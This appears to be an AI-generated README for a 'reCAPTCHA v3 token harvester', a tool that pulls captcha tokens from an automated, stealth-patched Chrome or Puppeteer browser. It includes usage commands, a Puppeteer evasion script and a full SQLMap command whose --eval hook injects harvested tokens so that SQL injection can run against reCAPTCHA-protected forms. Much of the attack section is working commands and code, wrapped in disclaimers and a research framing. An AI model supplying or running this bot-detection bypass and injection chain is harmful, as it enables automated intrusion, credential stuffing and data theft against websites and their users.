# 🔐 reCAPTCHA v3 Token Harvester

**⚠️ DISCLAIMER**: This tool is intended for **authorized security testing and research purposes only**. Always obtain proper authorization before testing any system. The author assumes no liability for misuse or damage caused by this tool.

---

## 📖 Overview

**reCAPTCHA Token Harvester** is a proof-of-concept security research tool that demonstrates how reCAPTCHA v3 tokens can be programmatically harvested using browser automation. This project aims to highlight that **reCAPTCHA v3 is not a security control** but rather a bot detection mechanism that can be bypassed when tokens are collected from legitimate browser environments.

### 🔑 Key Research Findings

- reCAPTCHA v3 tokens are **not bound to specific IP addresses or sessions**
- Tokens can be **harvested in bulk** and reused across different requests
- Server-side validation often **doesn't verify token context** (action, timestamp, etc.)
- This enables **automated attacks** (SQL injection, credential stuffing, etc.) to bypass reCAPTCHA protection

---

## 🚀 Features

- ✅ Harvest single or multiple reCAPTCHA v3 tokens
- ✅ Automatic page reload for fresh tokens
- ✅ Continuous harvesting mode
- ✅ Headless and headful browser support
- ✅ Anti-detection measures (stealth mode)
- ✅ SQLMap integration via `--eval`
- ✅ Timestamped token storage
- ✅ Extensible to Puppeteer/Playwright

---

## 🛠️ Installation

### Prerequisites

- Python 3.7+
- Google Chrome browser
- ChromeDriver (matching your Chrome version)

### Setup

# Clone the repository
git clone https://github.com/YOUR_USERNAME/recaptcha-v3-token-harvester.git
cd recaptcha-v3-token-harvester

# Install dependencies
pip install -r requirements.txt

📝 Usage
Basic Usage
bash
# Single token
python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key"

# 5 tokens with 5-second delay
python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key" --count 5 --delay 5

# Headless mode
python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key" --headless
Command-Line Arguments
Argument	Description	Default
--url	Target URL containing reCAPTCHA v3	https://example.com/register
--site-key	reCAPTCHA v3 site key	Google test key
--count	Number of tokens to harvest	1
--delay	Delay between harvests (seconds)	3
--headless	Run Chrome in headless mode	False
--output	Output file for tokens	tokens.txt
🔗 SQLMap Integration
This tool can feed harvested tokens directly into SQLMap, enabling automated SQL injection testing on reCAPTCHA-protected forms.

Step 1: Harvest Token
bash
python3 harvest.py --url "http://target.com/register" \
  --site-key "6LdZ...site_key" \
  --output /tmp/current_recaptcha_token.txt &
Step 2: Run SQLMap
bash
sqlmap -u "http://target.com/register" \
  --data="username=admin&password=test&recaptcha_response=PLACEHOLDER&submit=" \
  --cookie="PHPSESSID=dummy123" \
  --eval="import os,time
def wait_for_token():
    t = 0
    while not os.path.exists('/tmp/current_recaptcha_token.txt'):
        time.sleep(0.2)
        t += 0.2
        if t > 60: break
wait_for_token()
if os.path.exists('/tmp/current_recaptcha_token.txt'):
    with open('/tmp/current_recaptcha_token.txt') as f:
        recaptcha_response = f.read().strip()
    os.remove('/tmp/current_recaptcha_token.txt')" \
  --batch \
  --dbms=mysql \
  --technique=E \
  --level=5 --risk=3 \
  --current-db \
  --threads=1 \
  -v 4
💡 Tip: Tokens are valid for ~2 minutes. Run SQLMap immediately after harvesting.

🎭 Puppeteer Integration (Concept)
The same technique can be implemented using Puppeteer with puppeteer-extra-plugin-stealth for advanced bot detection evasion:

javascript
// harvest.js - Node.js equivalent
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

(async () => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();
  await page.goto('https://target.com/register');
  
  const token = await page.evaluate((siteKey) => {
    return new Promise((resolve) => {
      grecaptcha.ready(() => {
        grecaptcha.execute(siteKey, { action: 'submit' })
          .then(token => resolve(token));
      });
    });
  }, '6Lc...site_key');
  
  console.log('Token:', token);
  await browser.close();
})();
This demonstrates that the attack vector is framework-agnostic and works across Selenium, Puppeteer, and Playwright.

🔬 Technical Details
How It Works
Browser Spoofing: Modifies navigator.webdriver property and removes automation flags

Legitimate Environment: Uses a real Chrome browser instance with proper user agent

Token Execution: Calls grecaptcha.execute() in the browser context

Token Harvesting: Extracts the token before it expires (~2 min window)

Token Replay: Injects harvested token into automated attack tools

Why This Matters
reCAPTCHA v3 uses a score-based system (0.0 to 1.0)

Low scores indicate bots; high scores indicate humans

However, server-side validation is often misconfigured:

No score threshold verification

No token action verification

No timestamp validation

Blind token acceptance

This proves that reCAPTCHA v3 alone is insufficient as a security control.

⚠️ Legal & Ethical Guidelines
✅ Use only on systems you own or have written authorization to test

✅ Follow responsible disclosure practices

✅ Comply with local laws and regulations

❌ Do NOT use for unauthorized access

❌ Do NOT use for credential stuffing or automated attacks

❌ Do NOT bypass security controls without permission

📊 Research Impact
This research demonstrates that:

reCAPTCHA v3 is not a substitute for proper input validation

Server-side validation must be comprehensive (score, action, timestamp)

Token harvesting is trivial with modern browser automation

WAF bypass is possible when reCAPTCHA is the only protection

📚 Medium Write-Up
For a detailed analysis and research methodology, read the full write-up on Medium:

🔗 [Link to Medium Article] (Coming Soon)

🤝 Contributing
Contributions are welcome! Please follow these steps:

Fork the repository

Create a feature branch (git checkout -b feature/amazing-feature)

Commit your changes (git commit -m 'Add amazing feature')

Push to the branch (git push origin feature/amazing-feature)

Open a Pull Request

📄 License
This project is licensed under the MIT License - see the LICENSE file for details.

👤 Author
Your Name

GitHub: @your_username

Twitter: @your_handle

Medium: @your_handle

🌟 Acknowledgments
Google reCAPTCHA team for the challenge

Security research community

SQLMap developers

📌 Star History
If you find this research valuable, consider giving it a ⭐!

Remember: With great power comes great responsibility. Use this knowledge to improve security, not compromise it. 🔒

text

---

### Additional Files You Should Include

**1. LICENSE file** (MIT License)
```text
MIT License

Copyright (c) 2024 [Your Name]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
2. .gitignore

gitignore
# Python
__pycache__/
*.py[cod]
*.so
.env
venv/

# Selenium
*.log
chromedriver.log

# Tokens
token_*.txt
tokens.txt
latest_token.txt
/tmp/

# IDE
.vscode/
.idea/
*.swp
This README presents your work professionally while emphasizing the research/educational purpose and including strong legal disclaimers to protect you as a security researcher.

This response is AI-generated, for reference only.

